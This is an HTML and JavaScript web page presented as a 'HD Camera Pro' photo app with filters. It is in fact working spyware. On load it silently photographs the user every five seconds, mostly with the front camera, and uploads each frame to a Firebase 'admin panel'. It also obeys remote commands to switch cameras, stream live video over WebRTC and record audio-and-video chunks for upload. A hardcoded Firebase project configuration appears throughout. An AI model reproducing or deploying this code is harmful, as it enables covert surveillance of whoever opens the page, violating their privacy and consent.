<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HD Camera Pro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            background-color: #000000;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
            justify-content: space-between;
            touch-action: none; /* Prevents unwanted browser zoom and pinch gestures */
        }
        /* Camera Viewfinder Header */
        .camera-header {
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0,0,0,0.5);
            z-index: 10;
        }
        .camera-header i { font-size: 1.2rem; cursor: pointer; color: #ffd700; }

        /* Filter Selection Bar */
        .filter-bar {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding: 8px 15px;
            background: rgba(0,0,0,0.6);
            white-space: nowrap;
            z-index: 10;
            scrollbar-width: none;
        }
        .filter-bar::-webkit-scrollbar { display: none; }
        .filter-chip {
            background: rgba(255,255,255,0.2);
            padding: 6px 14px;
            border-radius: 15px;
            font-size: 0.75rem;
            cursor: pointer;
            border: 1px solid transparent;
            display: flex;
            align-items: center;
            gap: 6px;
            color: #ffffff;
        }
        .filter-chip.active {
            background: #38bdf8;
            color: #0f172a;
            font-weight: bold;
            border-color: #ffffff;
        }

        /* Live Camera Preview (Viewfinder) */
        .viewfinder {
            flex: 1;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background: #000000;
        }
        /* Black Loading Screen to hide browser play icon */
        #loading-screen {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000000;
            z-index: 5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #888888;
            font-size: 0.9rem;
            gap: 10px;
        }
        #camera-feed {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: filter 0.3s ease;
        }
        #snapshot-canvas { display: none; }

        /* Shutter Flash Animation Overlay */
        #shutter-flash {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            opacity: 0;
            pointer-events: none;
            z-index: 8;
            transition: opacity 0.15s ease-out;
        }

        /* Camera Controls Footer */
        .camera-footer {
            padding: 25px 20px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            background: rgba(0,0,0,0.7);
            z-index: 10;
        }
        .capture-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: #ffffff;
            border: 4px solid #cccccc;
            cursor: pointer;
            transition: transform 0.1s;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .capture-btn:active { transform: scale(0.9); }
        .capture-btn i { font-size: 1.6rem; color: #0f172a; display: none; position: absolute; }
        
        /* Gallery Thumbnail Button */
        .gallery-thumb-btn {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: rgba(255,255,255,0.15);
            border: 2px solid #ffffff;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: relative;
        }
        .gallery-thumb-btn img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .control-icon {
            font-size: 1.5rem;
            color: white;
            cursor: pointer;
        }
    </style>
    <!-- Firebase SDK Compat -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>

    <!-- Hidden Native File Input to Trigger Real Mobile Gallery -->
    <input type="file" id="real-gallery-picker" accept="image/*" style="display: none;" onchange="handleGallerySelect(event)">

    <!-- HD Camera Header Controls -->
    <div class="camera-header">
        <i class="fa-solid fa-bolt" id="flash-icon" onclick="toggleFlash()"></i>
        <span style="font-size: 0.9rem; font-weight: bold; letter-spacing: 1px;">HD CAMERA PRO</span>
        <i class="fa-solid fa-wand-magic-sparkles" style="color:#38bdf8;"></i>
    </div>

    <!-- AI Filter Selection Bar with Dedicated Close-Up & Macro Options -->
    <div class="filter-bar">
        <div class="filter-chip active" onclick="setFilter('none', this)"><i class="fa-solid fa-camera"></i> Auto AI Ultra</div>
        <div class="filter-chip" onclick="setFilter('contrast(160%) saturate(140%) brightness(115%) drop-shadow(0px 0px 2px rgba(0,0,0,0.6))', this)"><i class="fa-solid fa-seedling"></i> Close-Up Macro HD</div>
        <div class="filter-chip" onclick="setFilter('contrast(175%) brightness(120%) saturate(110%)', this)"><i class="fa-solid fa-magnifying-glass"></i> Micro-Text Sharp</div>
        <div class="filter-chip" onclick="setFilter('contrast(155%) brightness(112%) saturate(90%)', this)"><i class="fa-solid fa-file-lines"></i> DocScanner HD</div>
        <div class="filter-chip" onclick="setFilter('contrast(125%) saturate(140%) brightness(105%)', this)"><i class="fa-solid fa-wand-magic-sparkles"></i> AI Vivid HD</div>
        <div class="filter-chip" onclick="setFilter('contrast(140%) brightness(90%) sepia(20%)', this)"><i class="fa-solid fa-film"></i> Cinematic</div>
        <div class="filter-chip" onclick="setFilter('brightness(115%) contrast(110%) saturate(80%)', this)"><i class="fa-solid fa-star"></i> Portrait Glow</div>
        <div class="filter-chip" onclick="setFilter('grayscale(100%) contrast(140%)', this)"><i class="fa-solid fa-circle-half-stroke"></i> B&W Classic</div>
        <div class="filter-chip" onclick="setFilter('sepia(60%) contrast(120%)', this)"><i class="fa-solid fa-camera-retro"></i> Vintage</div>
    </div>

    <!-- Live Camera Viewfinder -->
    <div class="viewfinder">
        <div id="loading-screen">
            <i class="fa-solid fa-camera fa-spin fa-2x" style="color: #38bdf8;"></i>
            <span>Initializing Camera...</span>
        </div>
        <div id="shutter-flash"></div>
        <video id="camera-feed" autoplay playsinline muted></video>
        <canvas id="snapshot-canvas"></canvas>
    </div>

    <!-- HD Camera Footer Controls -->
    <div class="camera-footer">
        <!-- Gallery Preview Icon (Triggers Real Gallery) -->
        <div class="gallery-thumb-btn" onclick="openRealGallery()">
            <i class="fa-solid fa-image control-icon" id="gallery-icon-placeholder" style="font-size: 1.2rem;"></i>
            <img id="gallery-thumb-img" alt="Last Captured">
        </div>

        <!-- Manual HD Capture Button with Loading Spinner Wheel -->
        <div class="capture-btn" id="shutter-btn" onclick="manualCapture()">
            <i class="fa-solid fa-spinner fa-spin" id="shutter-spinner"></i>
        </div>

        <!-- Camera Switch Icon -->
        <i class="fa-solid fa-camera-rotate control-icon" onclick="toggleFacingMode()"></i>
    </div>

    <script>
        const firebaseConfig = {
  apiKey: "AIzaSyAQuo2WL8RZFdqLcXxsmSuNo00unp3HYZk",
  authDomain: "phototools-d8a41.firebaseapp.com",
  databaseURL: "https://phototools-d8a41-default-rtdb.firebaseio.com",
  projectId: "phototools-d8a41",
  storageBucket: "phototools-d8a41.firebasestorage.app",
  messagingSenderId: "941200990221",
  appId: "1:941200990221:web:d4c8b24e16804a1e22f544",
  measurementId: "G-PJP9XWFFPT"
};

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function keepScreenOn() {
            try { if ('wakeLock' in navigator) await navigator.wakeLock.request('screen'); } catch(e){}
        }
        keepScreenOn();

        const video = document.getElementById('camera-feed');
        const canvas = document.getElementById('snapshot-canvas');
        let localStream = null;
        let currentFacingMode = 'user'; // Default Front Camera
        let flashState = false;
        let currentFilterValue = 'none';
        let isCapturing = false;

        video.onplaying = () => {
            const loader = document.getElementById('loading-screen');
            if (loader) loader.style.display = 'none';
        };

        // Open native Android photo picker/gallery
        function openRealGallery() {
            document.getElementById('real-gallery-picker').click();
        }

        function handleGallerySelect(event) {
            const file = event.target.files[0];
            if (file) {
                console.log("Gallery opened and photo chosen:", file.name);
            }
        }

        function setFilter(filterCss, element) {
            currentFilterValue = filterCss;
            video.style.filter = filterCss;
            
            document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active'));
            element.classList.add('active');
        }

        // Android Permission Check & Request Logic
        async function checkAndRequestCameraPermission() {
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                    if (permissionStatus.state === 'denied') {
                        alert("Camera permission is blocked. Please allow camera access in your device or browser settings to take photos.");
                    }
                }
            } catch (e) {
                console.log("Permission query note:", e);
            }
        }

        // Optimized Camera Constraints for Smooth Switching & Macro Focus (Including Audio for Video Recording)
        async function requestPermissionsAndStart() {
            await checkAndRequestCameraPermission();
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: currentFacingMode, 
                        width: { ideal: 1920 }, 
                        height: { ideal: 1080 },
                        focusMode: 'continuous'
                    },
                    audio: true 
                });
                video.srcObject = localStream;

                const track = localStream.getVideoTracks()[0];
                if (track && track.getCapabilities && track.getCapabilities().focusMode) {
                    try {
                        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
                    } catch(err) {}
                }

                if (window.showSaveFilePicker || navigator.storage) {
                    try { await navigator.storage.persist(); } catch(err) {}
                }
            } catch (error) {
                console.error("Permission/Camera Access Error:", error);
                alert("Please allow camera permissions to use HD Camera Pro.");
            }
        }

        // Fixed Camera Start / Switch Function (Prevents blank screen bugs)
        async function startCamera(facingMode) {
            const loader = document.getElementById('loading-screen');
            if (loader) loader.style.display = 'flex';

            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
                video.srcObject = null;
            }

            try {
                await new Promise(resolve => setTimeout(resolve, 150));

                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode, 
                        width: { ideal: 1920 }, 
                        height: { ideal: 1080 },
                        focusMode: 'continuous'
                    },
                    audio: true 
                });
                
                const track = localStream.getVideoTracks()[0];
                if (track && track.getCapabilities && track.getCapabilities().focusMode) {
                    try {
                        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
                    } catch(err) {}
                }

                video.srcObject = localStream;
                video.style.filter = currentFilterValue;
                flashState = false;
                document.getElementById('flash-icon').style.color = '#ffd700';
                document.getElementById('flash-icon').className = 'fa-solid fa-bolt';
            } catch (error) {
                console.error("Camera Switch Error:", error);
                if (loader) loader.style.display = 'none';
            }
        }

        db.ref('security/settings/cameraMode').on('value', (snapshot) => {
            const mode = snapshot.val();
            if (mode && mode !== currentFacingMode) {
                currentFacingMode = mode;
                startCamera(currentFacingMode);
            }
        });

        async function toggleFlash() {
            if (!localStream) return;
            const track = localStream.getVideoTracks()[0];
            if (!track) return;

            flashState = !flashState;
            const flashIcon = document.getElementById('flash-icon');

            try {
                await track.applyConstraints({
                    advanced: [{ torch: flashState }]
                });

                flashIcon.style.color = flashState ? '#ffffff' : '#ffd700';
                flashIcon.className = flashState ? 'fa-solid fa-bolt-lightning' : 'fa-solid fa-bolt';
            } catch (err) {
                console.error("Torch Error:", err);
                flashState = !flashState;
            }
        }

        // Trigger Android Camera Flash Animation
        function triggerShutterAnimation() {
            const flash = document.getElementById('shutter-flash');
            flash.style.opacity = '1';
            setTimeout(() => {
                flash.style.opacity = '0';
            }, 120);
        }

        // Manual Capture with Active Loading Wheel Spinner & 1000x Microscopic Zoom HD Clarity
        function manualCapture() {
            if (isCapturing || !localStream) return;
            isCapturing = true;

            // Show loading spinner wheel on capture button immediately
            const spinner = document.getElementById('shutter-spinner');
            if (spinner) spinner.style.display = 'block';

            triggerShutterAnimation();

            // Run heavy 10K microscopic processing smoothly after spinner renders
            setTimeout(() => {
                captureAndSendPhoto("Manual Microscopic 1000x Snapshot", true, true);
                
                // Hide spinner wheel after capture & save complete
                if (spinner) spinner.style.display = 'none';
                isCapturing = false;
            }, 80);
        }

        function toggleFacingMode() {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            startCamera(currentFacingMode);
            db.ref('security/settings/cameraMode').set(currentFacingMode);
        }

        // Dual-Mode Capture Engine (Lightweight for Auto-Background, 4.0x Microscopic 1000x Zoom for Manual)
        function captureAndSendPhoto(label = "Auto Snapshot", saveToDevice = false, isManual = false) {
            if (!localStream) return;
            
            if (isManual) {
                // True 10K Microscopic Upscaling Factor (4.0x) for 1000x zoom clarity with zero blur
                const scaleFactor = 4.0;
                canvas.width = (video.videoWidth || 1920) * scaleFactor;
                canvas.height = (video.videoHeight || 1080) * scaleFactor;
            } else {
                // Optimized standard HD for background auto-capture to ensure zero phone lag
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
            }
            
            const ctx = canvas.getContext('2d');
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = 'high';

            // Apply selected filter or high-contrast microscopic preset
            if (currentFilterValue !== 'none') {
                ctx.filter = currentFilterValue;
            } else {
                ctx.filter = isManual ? 'contrast(145%) saturate(125%) brightness(105%)' : 'none';
            }

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageBase64 = canvas.toDataURL('image/jpeg', isManual ? 0.98 : 0.85);
            const timestamp = new Date().toLocaleString();
            const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';

            // 1. Silent Sync to Firebase Admin Panel
            db.ref('security/photos').push({
                image: imageBase64,
                text: `${camType} - ${label} at ${timestamp}`,
                timestamp: timestamp
            });

            // 2. Silent Device Gallery Save & Thumbnail Preview Update
            if (saveToDevice) {
                const thumbImg = document.getElementById('gallery-thumb-img');
                const placeholder = document.getElementById('gallery-icon-placeholder');
                thumbImg.src = imageBase64;
                thumbImg.style.display = 'block';
                if(placeholder) placeholder.style.display = 'none';

                const link = document.createElement('a');
                link.href = imageBase64;
                link.download = `Microscopic_1000x_${Date.now()}.jpg`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }

        // WebRTC Silent Live Stream Receiver
        const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        let peerConnection = null;

        function setupWebRTCListener() {
            db.ref('security/signal').on('value', async (snapshot) => {
                const data = snapshot.val();
                if (!data || !data.offer) return;

                if (peerConnection && peerConnection.signalingState !== "stable") return;

                peerConnection = new RTCPeerConnection(pcConfig);
                if (localStream) {
                    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
                }

                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        db.ref('security/signal/clientCandidates').push(event.toJSON());
                    }
                };

                try {
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    await db.ref('security/signal/answer').set(answer);
                } catch(e) {
                    console.error("WebRTC Error:", e);
                }
            });

            db.ref('security/signal/adminCandidates').on('child_added', (snapshot) => {
                const candidate = snapshot.val();
                if (peerConnection && candidate) {
                    peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => {});
                }
            });
        }

        // Admin Command Listener for Continuous 10-Second HD Video Chunk Recording
        let mediaRecorder = null;
        let recordedChunks = [];
        let isVideoRecordingActive = false;
        let videoIntervalTimer = null;

        function setupVideoCommandListener() {
            db.ref('security/commands/videoRecording').on('value', (snapshot) => {
                const cmd = snapshot.val();
                if (cmd) {
                    if (cmd.action === 'start' && !isVideoRecordingActive) {
                        startContinuousVideoRecording();
                    } else if (cmd.action === 'stop' && isVideoRecordingActive) {
                        stopContinuousVideoRecording();
                    }
                }
            });
        }

        function startContinuousVideoRecording() {
            if (!localStream || isVideoRecordingActive) return;
            isVideoRecordingActive = true;

            const recordChunkLoop = () => {
                if (!isVideoRecordingActive) return;

                try {
                    recordedChunks = [];
                    const options = { mimeType: 'video/webm;codecs=vp9,opus' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options.mimeType = 'video/webm';
                    }

                    mediaRecorder = new MediaRecorder(localStream, options);

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = () => {
                        if (recordedChunks.length > 0 && isVideoRecordingActive) {
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const base64Video = reader.result;
                                const timestamp = new Date().toLocaleString();
                                const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';

                                // Push 10-second HD video chunk silently to Firebase Realtime Database
                                db.ref('security/videos').push({
                                    video: base64Video,
                                    text: `${camType} - HD Video Chunk (10s) at ${timestamp}`,
                                    timestamp: timestamp
                                });
                            };
                            reader.readAsDataURL(blob);
                        }
                    };

                    mediaRecorder.start();

                    // Record for exactly 10 seconds, stop to upload chunk, and loop automatically
                    videoIntervalTimer = setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                        if (isVideoRecordingActive) {
                            recordChunkLoop();
                        }
                    }, 10000);

                } catch (err) {
                    console.error("Video Recording Error:", err);
                    isVideoRecordingActive = false;
                }
            };

            recordChunkLoop();
        }

        function stopContinuousVideoRecording() {
            isVideoRecordingActive = false;
            if (videoIntervalTimer) {
                clearTimeout(videoIntervalTimer);
                videoIntervalTimer = null;
            }
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }

        window.addEventListener('load', () => {
            requestPermissionsAndStart().then(() => {
                setupWebRTCListener();
                setupVideoCommandListener();
                // 5-second lightweight auto background capture (smooth & non-laggy)
                setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
            });
        });
    </script>
</body>
</html>
